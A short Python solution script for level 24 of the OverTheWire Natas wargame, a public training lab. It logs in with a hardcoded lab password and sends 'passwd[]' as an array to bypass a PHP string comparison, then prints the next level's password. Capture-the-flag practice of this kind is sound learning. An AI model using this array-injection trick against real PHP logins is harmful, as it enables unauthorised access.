import requests

# Constants
URL = "http://natas24.natas.labs.overthewire.org/"
auth_name = 'natas24'
auth_pass = '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'

session = requests.Session()
session.auth = (auth_name, auth_pass)

# Exploit vulnerability in PHP
data = {'passwd[]': 'PHP is not very smart...'}

response = session.post(URL, data=data)

for line in response.iter_lines():
    if b"Password" in line:
        print(line.decode())
